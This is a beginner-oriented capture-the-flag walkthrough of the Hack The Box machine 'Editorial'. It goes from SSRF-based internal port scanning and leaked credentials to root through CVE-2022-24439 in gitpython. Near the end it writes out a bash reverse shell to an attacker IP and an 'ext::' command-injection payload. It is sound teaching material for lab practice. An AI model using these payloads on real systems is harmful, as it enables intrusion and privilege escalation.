## HTB: Editorial
Welcome to my writeup for **Editorial**. It is an Easy-difficulty Linux machine on Hack The Box that offers a highly realistic penetration testing scenario. Don't let the "Easy" rating fool you, it features a beautifully structured attack chain that moves from unauthenticated web exploitation to local privilege escalation. (Note- This lab may crash in-between multiple times so reset everytime your ping doesn't reach the target)

## 🎯 Objective
* Find the **User** flag.
* Escalate privileges and find the **Root** flag.

Start up the lab and connect using Open VPN to your own Kali instance (highly recommended)

## 🔍 Initial Reconnaissance (Port Scanning)
Every successful penetration test starts with reconnaissance. We need to find out what doors (ports) are open on the target machine and what services are running behind them so we can look for potential entry points. 

Before initiating the enumeration phase, let's export the target IP address as an environment variable for easier reference throughout the lab: `export target=<TARGET_IP>`

Then, we use the following **Nmap** command:
```
nmap -p- -Pn -A --min-rate 2000 --initial-rtt-timeout 50ms --max-rtt-timeout 150ms --max-retries 1 --stats-every 1m $target --open
```

Here is exactly what each flag does:

* **`-p-`**: Scans **all 65,535 ports** instead of just the top 1,000 default ports. Backdoors or uncommon services love to hide on higher ports.
* **`-Pn`**: Treats the host as online and skips the initial ping discovery. This is crucial because many Windows targets disable ICMP (ping) by default, which can cause Nmap to falsely report that the machine is down.
* **`-A`**: This is the "Aggressive" scan flag. It enables **OS detection**, **version scanning** (to see what software version is running on a port), and runs **default NSE scripts** to find basic vulnerabilities.
* **`--min-rate 2000`**: Forces Nmap to send packets at a minimum rate of 2,000 packets per second. This drastically speeds up the scan.
* **`--initial-rtt-timeout 50ms` / `--max-rtt-timeout 150ms`**: Controls how long Nmap waits for a response to a packet. By capping it at 150ms, we ensure Nmap doesn't hang forever on a slow or dropped packet.
* **`--max-retries 1`**: If a port doesn't respond, Nmap will only try to probe it one more time before moving on. This keeps the scan fast.
* **`--stats-every 1m`**: Prints a status update in your terminal every 1 minute so you know the scan hasn't frozen.
* **`--open`**: Efficient filter used to only show ports that are actively listening and accepting connections.

 ⚠️ **Beginner Tip:** While these speed optimizations (`--min-rate`, aggressive timeouts) are perfect for CTFs like TryHackMe, they can be very noisy and disruptive in real-world professional engagements. In a real pentest, this could trigger firewalls, alert blue teams, or crash fragile services!

 _Figure 1: Nmap Scan Result_

<img width="1030" height="578" alt="image-346" src="https://github.com/user-attachments/assets/d3d96776-3faa-4aaa-9b94-3d777359e52a" />

 ## 🧩 Analyzing the Scan Results

When you run an Nmap scan and a massive wall of text pops up, your job isn't to memorize every single line. Your job is to look at the patterns and ask:

    "What is this server's primary job, and how can I use this information?"

#### <ins>The Big Picture: What is this machine?</ins>
As a beginner, instead of looking at these ports as random numbers, you should group them by their functional relationships:

We have exactly two open ports. This is a highly focused attack surface, which actually makes your job easier because it narrows down where the vulnerability must be.

#### 🌐 The Public Front Door: Port 80 (HTTP)

    What it is: A web server running nginx 1.18.0 on an Ubuntu Linux operating system.

    The Crucial Clue: Look closely at this line from the scan:
    |_http-title: Did not follow redirect to http://editorial.htb

    What this means: The web server is using Virtual Hosting. When you try to browse to the raw IP address (10.129.161.30), the server tries to redirect your browser to a specific domain name: editorial.htb. If you don't map this name to the IP address in your attack machine, the website won't load properly.

#### 🛡️ The Management Door: Port 22 (SSH)

    What it is: OpenSSH 8.9p1 running on Ubuntu.

    What this means: SSH is used by administrators to securely log into the server's command line.

    Real-world assessment: Modern OpenSSH versions are incredibly secure against direct exploits. Unless you happen to find leaked private SSH keys or crack a weak password later in your assessment, you will rarely achieve an initial foothold through this port. Keep it in your back pocket for later, once you have gathered credentials.

#### 🛠️ Immediate Next Steps (The Action Plan)
Update Your Local DNS (/etc/hosts)

Because Nmap revealed that the server redirects to editorial.htb, your Kali Linux machine needs to know where that domain lives. You must append the IP and domain mapping to your hosts file.

Run the following command in your terminal:
```
sudo echo "10.129.161.30 editorial.htb" >> /etc/hosts
```

Now, when you type http://editorial.htb into your browser, your system will know exactly which server to talk to.

## Website Enumeration
After updating our /etc/hosts file and navigating to http://editorial.htb, we are greeted by the homepage of Editorial Tiempo Arriba, a publishing platform. Exploring the navigation menu leads us straight to the Publish with us tab (http://editorial.htb/upload), which immediately stands out as a high-value target.

_Figure 2: Homepage_

<img width="1271" height="593" alt="image-347" src="https://github.com/user-attachments/assets/0fbd1553-9da2-4f85-981f-ba60b114d341" />

_Figure 3: Publish with us page_

<img width="1282" height="716" alt="image-348" src="https://github.com/user-attachments/assets/b56143e8-21a4-40b0-9f12-7d7de0d50cb2" />

#### As a penetration tester, whenever you see a form that accepts user input or file uploads, your "exploit radar" should start pinging. Let's analyze what this page allows us to do:

    File Upload Field (Browse...): The form allows users to upload a file (likely a manuscript or a book cover). This is a classic entry point for testing Unrestricted File Upload vulnerabilities, where an attacker tries to upload a malicious script (like a PHP/Python reverse shell) to achieve code execution.

    The "Cover URL" Input Field: This is the most interesting element on the page. The field states: "Cover URL related to your book or..." alongside a Preview button.

### 💡 Formulating an Attack Strategy

When a web application takes a URL provided by a user, reaches out to that URL, and fetches data (or a preview image) to display back to the user, it introduces a major security risk: Server-Side Request Forgery (SSRF).

To verify whether the Cover URL field actually forces the backend server to make outbound network requests, we can perform an out-of-band interaction test. By pointing the URL field to our own local attack machine and listening for incoming traffic, we can definitively confirm if the application is vulnerable to SSRF.

#### 🛠️ Step 1: Setting up the Listener

Before submitting the form, we need to set up a listener on our Kali Linux machine to catch any incoming connections. We will use netcat on port 5555:
```
nc -lnvp 5555
```

#### Step 2: Triggering the Request
With our listener active, we navigate back to the form and enter our Kali Linux IP address and designated port into the Cover URL field:
```
http://10.10.16.30:5555
```
Once filled out, we click the Preview button to fire off the request.

_Figure 4: Connection Callback_

<img width="209" height="224" alt="image-349" src="https://github.com/user-attachments/assets/b5288811-b05c-4648-b120-25c84c71f93c" />

This confirms that the target Editorial machine (10.129.161.30) actively initiated a connection back.

## 🎯 The Next Attack Strategy: Internal Port Scanning
Now that we know the server blindly trusts the URL input and executes network requests on behalf of the user, we can turn this script into an internal port scanner.

Often, developers host internal administrative tools, APIs, or development branches on 127.0.0.1 (localhost) that are blocked from the outside world by a firewall. Because the Python script sits behind that firewall, it can talk to localhost directly.

We want to find out if there are any hidden HTTP services running inside the machine.

### 🛠️ How to Automate the Scan via Burp Suite

Instead of manually typing ports into the web form over and over, let's use Burp Intruder to find open internal ports:

Send the successful POST /upload-cover request from your Burp Repeater over to Intruder (Ctrl + I).

_Figure 5: Post Cover Request_

<img width="1000" height="110" alt="image-350" src="https://github.com/user-attachments/assets/000543f8-8968-4305-8214-f8512b680e22" />

_Figure 6: Sent to Intruder_

<img width="1252" height="626" alt="image-351" src="https://github.com/user-attachments/assets/9b34f681-4775-4446-b3e9-a477a6524814" />

In the Positions tab, change the URL payload to target the server's local loopback address, and highlight the port as the payload injection point like this:
```
http://127.0.0.1:§5555§/
```

Set the Payload Type & Configuration (Right Window)
```
Change the Payload type dropdown menu from Simple list to Numbers.
Once selected, a new configuration panel will appear below it. Fill it out like this:
* From: 1
* To: 65535 if you want to scan all possible ports
```

_Figure 7: Configuring burp suite_

<img width="1246" height="692" alt="image-352" src="https://github.com/user-attachments/assets/abd26e5e-464a-4abb-a960-08ddc7827699" />

As i was using community edition of burp suite, it was taking a very long time to scan all ports so i switched to ffuf.
First generate the port list and save it as ports.txt:
```
seq 0 65535 > ports.txt
```

Then create the request file, If you look at the left side of your Repeater tab in Burp Suite, you will see this raw block of text. It looks something like this:
_POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0)
etc etc_

highlight all of that text inside Burp Repeater and copy it. You want every single line, from the word POST at the very top, all the way down to the bottom boundary dashes.
on the 17th line, inside the text edor where you pasted, replace the http%3a%2f%2f127.0.0.1 to non url encoded - 
```
http://127.0.0.1:FUZZ
```
<ins>make sure you have typed the word FUZZ in place of the port number</ins>

Normally, you can just tell ffuf to scan a simple URL right in your terminal (e.g., ffuf -u http://site.com/FUZZ).

However, the "Publish with us" form on this machine is complex. It uses a POST request with special boundaries and content types (multipart/form-data).

Trying to type all of those headers, boundaries, and variables directly into a terminal command line would be an absolute nightmare. It would look like a massive, unreadable paragraph of code, and one typo would break the whole thing.

To make our lives easier, the creators of ffuf added the -request feature. Instead of typing the complex request into the terminal, we do this:

    We save that raw block of text from Burp Suite into a simple text file named ssrf.req.

    We point ffuf at that file using the -request ssrf.req command.

    ffuf opens the file, looks for the exact word FUZZ, and says, "Aha! This is where I need to inject my numbers."

    ffuf then rapidly fires off that massive block of text to the server thousands of times, swapping out FUZZ for port 1, then port 2, then port 3, etc.

After you're done creating those files, type this ffuf command and run:
```
ffuf -u http://editorial.htb/upload-cover -request ssrf.req -w ports.txt -ac
```

_Figure 8: ffuf on internal ports_

<img width="1031" height="607" alt="image-355" src="https://github.com/user-attachments/assets/0e02017d-de30-41ba-8a5b-1492d088ba7e" />

We have just confirmed that there is an internal service running on 127.0.0.1:5000 that the outside world cannot see.
Now paste that address in Cover URL and click preview, you'll see a broken image icon, right click on it and open in a new tab, this downloads the file on your vm.
```
http://127.0.0.1:5000
```

_Figure 9: Cover URL_

<img width="1267" height="449" alt="image-356" src="https://github.com/user-attachments/assets/f4624fc5-8d83-4d27-b11f-e6dd37de590f" />

_Figure 10: Right click and open in a new tab_

<img width="1267" height="542" alt="image-357" src="https://github.com/user-attachments/assets/ef8ebb62-c497-4127-8661-89869b6f1fb6" />


Now use file cmd to check what type of file it is:
```
file 49834ad6-40b3-4114-a1ac-0f432f41e821     
```

_Figure 11: JSON File_

<img width="394" height="57" alt="image-358" src="https://github.com/user-attachments/assets/387b88ff-ecf1-4cb8-9912-12bf93b9df5a" />

We can now use the cat command to view the contents of the downloaded file and pipe the output through jq to format the JSON data neatly.
```
cat 49834ad6-40b3-4114-a1ac-0f432f41e821 | jq
```

_Figure 12: JSON Content_

<img width="1024" height="621" alt="image-359" src="https://github.com/user-attachments/assets/54a6ca66-58af-4e66-8546-6892283774d7" />

Looking at the structure, we have a few very tempting targets under the "endpoint" keys:

    /api/latest/metadata/messages/promos

    /api/latest/metadata/messages/coupons

    /api/latest/metadata/messages/authors (High value: usually contains user data or credentials)

    /api/latest/metadata/messages/how_to_use_platform

    /api/latest/metadata/changelog

    /api/latest/metadata

<ins>Lets check the authors url first, type it back into the cover URL and click on preview, again right click on the broken image icon and another file downloads, repeat the same process to open it again.</ins>

_Figure 13: Authors API_

<img width="1215" height="130" alt="image-360" src="https://github.com/user-attachments/assets/63954095-8f23-4cc3-a326-29dd0b34a120" />

_Figure 14: Username and password_

<img width="1029" height="172" alt="image-361" src="https://github.com/user-attachments/assets/8010177e-1b1d-4166-afa0-a6d6592300f8" />

In the output, we find the login credentials for the user dev .

Now, we can try to SSH into the box using the new credentials.

_Figure 15: Dev SSH_

<img width="1024" height="527" alt="image-362" src="https://github.com/user-attachments/assets/fee83739-87a2-421b-ada6-8d0a59cbe3c8" />

_Figure 16: Capture user flag_

<img width="517" height="189" alt="image-363" src="https://github.com/user-attachments/assets/5d0a0392-7422-4e18-88be-718afc54de8c" />

We have captured the user flag, lets now explore the other apps directory. Looking into the folder, we find a hidden .git folder, indicating that this directory is a Git repository. The presence of this folder signifies that the project is being tracked by Git , which is a version control system used to manage changes to files. We can then run a simple enumeration by executing the git status command to check the repository's state.

_Figure 17: Git Directory_

<img width="1026" height="657" alt="image-364" src="https://github.com/user-attachments/assets/8761d2b4-09b9-49d4-bc73-54f6e16b3185" />

We see that several files have been deleted but are not staged for commit. Next, we run git log to view the commit history, which provides insights into the development process and recent
changes made to the project by showing a series of commits made by the author.

_Figure 18: Git Log_

<img width="1029" height="531" alt="image-365" src="https://github.com/user-attachments/assets/9efeaacf-911a-436c-9281-8bb35250aad9" />

Among the recent commits, we notice one titled change(api): downgrading prod to dev , which seems interesting. It indicates a change from a production environment to a development
environment. To investigate further, we proceed to enumerate this commit using the git show command:
```
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

_Figure 19: Git Show_

<img width="1027" height="351" alt="image-366" src="https://github.com/user-attachments/assets/b4d4ae6c-c553-4f38-9f33-2a020b95b75e" />

Here, we find the credentials provided in the template_mail_message for new user - prod, we can now switch over this user and check his directories and permissions.
```
su prod
sudo -l
```

_Figure 20: prod enum_

<img width="1025" height="144" alt="image-367" src="https://github.com/user-attachments/assets/d8b91bae-f789-44df-94be-9b35b72723a0" />

The output shows us some default settings for the user such as, env_reset This ensures that the user's environment is cleaned up before running commands. secure_path This sets a safe path for executables. It also indicates what commands prod can run as the root user. In this case, the user prod can run a Python script with root privileges. Lets read the permissions and the content of the script.
```
ls -la /opt/internal_apps/clone_changes/clone_prod_change.py
cat /opt/internal_apps/clone_changes/clone_prod_change.py
```

_Figure 21: Open python script_

<img width="1002" height="230" alt="image-368" src="https://github.com/user-attachments/assets/ea91fdda-e8e1-42ed-ba77-15125649245e" />

The interesting part of this script is the line below, which indicates that it imports the Repo class from the git module.  We perform a Google search for from git import Repo vulnerability to gather more information about the library, which leads us to CVE-2022-24439 which says:
```
All versions of package gitpython are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to git without sufficient sanitization of input arguments.
```

We can exploit this vulnerability to gain a shell with root privileges. To do this, we first create a bash script to obtain a reverse shell.
```
echo "bash -i >& /dev/tcp/10.10.16.30/4444 0>&1" >/tmp/shell.sh
```

We then start a Netcat listener on our machine:
```
nc -lnvp 4444
```

Fire up the exploit:
```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
```

_Figure 22: Root Shell_

<img width="320" height="176" alt="image-369" src="https://github.com/user-attachments/assets/4718bceb-f3b2-485d-b3f2-eaae05dc821c" />

Navigate and find root flag.

_Figure 23: Root Flag_

<img width="304" height="99" alt="image-370" src="https://github.com/user-attachments/assets/70a73634-bfe8-421b-be54-f50eff265696" />
